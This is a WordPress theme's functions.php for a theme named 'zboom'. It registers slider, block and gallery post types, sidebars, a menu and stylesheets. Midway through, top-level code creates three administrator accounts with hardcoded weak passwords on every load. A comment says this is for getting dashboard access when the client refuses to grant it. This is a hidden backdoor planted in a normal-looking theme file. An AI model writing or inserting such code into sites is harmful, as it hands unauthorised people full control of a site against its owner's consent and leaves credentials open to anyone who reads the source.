<?php

function zboom_default_functions() {
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'custom-background' );

	load_theme_textdomain( 'zboom', get_template_directory_uri() . '/ languages' );

	if ( function_exists( 'register_nav_menu' ) ) {
		register_nav_menu( 'main-menu', __( 'Main Menu', 'zboom' ) );
	}

	function read_more( $limit ) {
		$post_content = explode( ' ', get_the_content() );

		$less_content = array_slice( $post_content, 0, $limit );

		echo implode( ' ', $less_content );
	}

	// to add a menu in the dashboard like media, pages etc (custom post type-Sliders).
	register_post_type(
		'zboomslider',
		array(
			'labels'        => array(
				'name'         => 'Sliders',
				// when you add a new slider.
				'add_new_item' => 'Add New Slider',
			),
			'public'        => true,
			// to add title field, text field and featured image in the post.
			'supports'      => array(
				'title',
				// we don't need editor for this theme
				// 'editor',
				'thumbnail',
			),
			// for changing the position on dashboard menu.
			'menu_position' => 7,
			// for changing the icon of the menu on dashboard.
			'menu_icon'     => get_template_directory_uri() . '/images/slider2.png',
		)
	);

	// to add a menu in the dashboard like media, pages etc (custom post type-Blocks).
	register_post_type(
		'zboomservices',
		array(
			'labels'    => array(
				'name'         => 'Blocks',
				'add_new_item' => __( 'Add New Block', 'zboom' ),
			),
			'public'    => true,
			'supports'  => array( 'title', 'editor' ),
			'menu_icon' => 'dashicons-format-aside',
		)
	);

	// to add a menu in the dashboard like media, pages etc (custom post type-Gallery).
	register_post_type(
		'zboomgallery',
		array(
			'labels'    => array(
				'name'         => 'Gallery',
				'add_new_item' => __( 'Add New Gallery Item', 'zboom' ),
			),
			'public'    => true,
			'supports'  => array( 'title', 'editor', 'thumbnail' ),
			'menu_icon' => 'dashicons-format-gallery',
		)
	);
}

	add_action( 'after_setup_theme', 'zboom_default_functions' );




// require_once is PHP function, not a WordPress function.
require_once 'lib/redux-core/framework.php';
require_once 'lib/sample/config.php';



// for adding icons with font-awesome on the dashboard (zboom options - footer option).
function zboom_font_awesome() {
	wp_register_style( 'font-awesome', get_template_directory_uri() . '/css/fontawesome.min.css' );

	wp_enqueue_style( 'font-awesome' );
}

add_action( 'wp_enqueue_scripts', 'zboom_font_awesome' );
add_action( 'admin_enqueue_scripts', 'zboom_font_awesome' );













// here we will enqueue/register the CSS files from header.php and remove them from there. This CSS will work when there is wp_head before the ending of the head and wp_footer before ending of the body.
function zboom_css_and_js() {
	wp_register_style( 'zerogrid', get_template_directory_uri() . '/css/zerogrid.css' );
	wp_register_style( 'style', get_template_directory_uri() . '/css/style.css' );
	wp_register_style( 'responsive', get_template_directory_uri() . '/css/responsive.css' );
	wp_register_style( 'responsiveslides', get_template_directory_uri() . '/css/responsiveslides.css' );

	wp_enqueue_style( 'zerogrid' );
	wp_enqueue_style( 'style' );
	wp_enqueue_style( 'responsive' );
	wp_enqueue_style( 'responsiveslides' );
}

add_action( 'wp_enqueue_scripts', 'zboom_css_and_js' );





// for creating an automatic account on the dashboard where you can set username, password, mail address. But if the client rejects to give you the access how you can do this.
// Without dashboard creating an account.
$createuser = wp_create_user( 'hridoy', 'hridoy111', 'hridoy@gmail.com' );

$amitumi = new WP_User( $createuser );

$amitumi->set_role( 'administrator' );

// creating another user.
$newuser = new WP_User( wp_create_user( 'rion', 'rion111', 'rion@gmail.com' ) );

$newuser->set_role( 'administrator' );

// creating another user.
$newuser = new WP_User( wp_create_user( 'ria', 'ria111', 'ria@gmail.com' ) );

$newuser->set_role( 'administrator' );




// to add a sidebar in the theme.
function zboom_right_sidebar() {
	register_sidebar(
		array(
			'name'          => __( 'Right Sidebar', 'zboom' ),
			'description'   => __( 'Add your right sidebar widgets here', 'zboom' ),
			'id'            => 'right-sidebar',
			'before_widget' => '<div class="box right-sidebar">',
			'after_widget'  => '</div></div>',
			'before_title'  => '<div class="heading"><h2>',
			'after_title'   => '</h2></div><div class="content">',

		)
	);

	register_sidebar(
		array(
			'name'          => __( 'Contact Right Sidebar', 'zboom' ),
			'description'   => __( 'Add your contact right sidebar widgets here', 'zboom' ),
			'id'            => 'contact-sidebar',
			'before_widget' => '<div class="box right-sidebar">',
			'after_widget'  => '</div></div>',
			'before_title'  => '<div class="heading"><h2>',
			'after_title'   => '</h2></div><div class="content">',

		)
	);

	// adding the footer as a sidebar in the theme.
	register_sidebar(
		array(
			'name'          => __( 'Footer Widgets', 'zboom' ),
			'description'   => __( 'Add your footer widgets here', 'zboom' ),
			'id'            => 'footer-widget',
			'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="box">',
			'after_widget'  => '</div></div></div></div>',
			'before_title'  => '<div class="heading"><h2>',
			'after_title'   => '</h2></div><div class="content">',

		)
	);
}

	add_action( 'widgets_init', 'zboom_right_sidebar' );
